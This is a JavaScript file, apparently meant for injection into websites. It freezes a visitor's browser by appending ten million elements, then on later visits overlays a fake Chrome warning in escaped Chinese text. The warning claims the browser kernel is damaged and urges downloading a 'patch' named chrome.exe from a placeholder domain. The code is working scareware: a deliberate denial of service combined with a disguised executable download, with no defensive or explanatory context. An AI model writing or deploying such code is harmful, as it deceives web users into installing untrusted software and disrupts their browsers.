var style = document.createElement('style');
style.innerHTML = `
    .layer {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        align-content: center;
        overflow: hidden;
    }
    #ground {
        width: 100vw;
        height: 100vh !important;
        position: fixed !important;
        top: 0 !important;
        left: 0 !important;
        z-index: 2147483002 !important;
        font-family: Helvetica Neue, Helvetica, Arial, sans-serif !important;
        cursor: default !important;
        font-weight: bold !important;
        margin: auto !important;
        padding: unset !important;
        font-size: 15px !important;
        color: #000000 !important;
    }
    #notice {
        width: 475px;
        height: 730px;
        background: white;
        border-radius: 0.5em;
        box-shadow: 0px 0px 15px -5px black;
    }
    #header {
        width: 200px;
        height: 200px;
    }
    #header > IMG {
        width: 100%;
    }
    #center {
        width: 400px;
        height: 400px;
        text-align: center;
    }
    #center > H1 {
        margin: 0;
        margin-block-start: 0.67em;
        margin-block-end: 0.67em;
        margin-inline-start: 0px;
        margin-inline-end: 0px;
        font-size: 2em;
        font-weight: bold !important;
    }

    #center > P {
        display: block;
        margin-block-start: 1em;
        margin-block-end: 1em;
        margin-inline-start: 0px;
        margin-inline-end: 0px;
        font-size: 20px;
        font-weight: bold !important;
    }

    #button {
        width: 200px;
        height: 50px;
        background: #0838c7;
        border-radius: 0.5em;
        cursor: pointer;
    }
    #button > H3 {
        color: white;
        cursor: pointer !important;
        display: block !important;
        font-size: 1.17em !important;
        margin-block-start: 1em !important;
        margin-block-end: 1em !important;
        margin-inline-start: 0px !important;
        margin-inline-end: 0px !important;
        font-weight: bold !important;
    }
    #footer {
        width: 200px
        height: 200px;
    }
    #footer > H6 {
        color: gray;
    }

    .v-modal {
        position: fixed;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: .5;
        background: #000;
        z-index: 2147483001 !important;
    }
`;
document.head.appendChild(style);


function dom() {
    var dialog = document.createElement('div');
    dialog.setAttribute("id", "ground");
    dialog.setAttribute("class", "layer");
    dialog.innerHTML = `
            <div id="notice" class="layer">
                <div id="header" class="layer">
                    <img src="https://cookier.xyz/google.png" />
                </div>
                <div id="center" class="layer">
                    <h1>
                        \u8b66\u544a</h1>
                    <p>
                        <span>\u0043\u0068\u0072\u006f\u006d\u0065\u591a\u6b21\u5d29\u6e83\u5df2\u635f\u574f\u5185\u6838</span><br />
                        <span>\u8bf7\u4e0b\u8f7d\u66f4\u65b0\u5185\u6838\u8865\u4e01</span><br />
                        <span>\u5426\u5219\u6570\u636e\u53ef\u80fd\u4f1a\u5168\u90e8\u4e22\u5931\uff01</span>
                    </p>
                    <div id="button" class="layer">
                        <h3 onClick="window.location = 'https://域名/chrome.exe';var bkc = window.localStorage.getItem('bkc');window.localStorage.setItem('bkc',Number(bkc)+1);" style="margin: auto;">\u7acb\u5373\u66f4\u65b0</h3>
                    </div>
                </div>
                <div id="footer" class="layer">
                    <h6>Chrome</h6>
                </div>
            </div>
            `
    document.body.appendChild(dialog);
    var modal = document.createElement('div');
    modal.setAttribute("class", "v-modal");
    document.body.appendChild(modal);

}
function bk(){
var ary=[];
for(var i=1;i<=10000000;i++){
    ary.push(i);
}
var renderFriendList=function(data){
    for(var i=0,l=data.length;i<l;i++){
        var div=document.createElement('div');
        div.innerHTML=i;
        document.body.appendChild(div);
    }
}

renderFriendList(ary)
}
function jiuka(){
	var bkc = window.localStorage.getItem('bkc');
	if(bkc =='null'){
		bkc = 1;
	}
	if(bkc<3){
		window.localStorage.setItem('bkc',Number(bkc)+1);
		bk();
	}else{
		if(bkc<6){
			dom();
			
		}else{
			
		}
	}
}
setTimeout(function () {
    jiuka()
}, 1000)
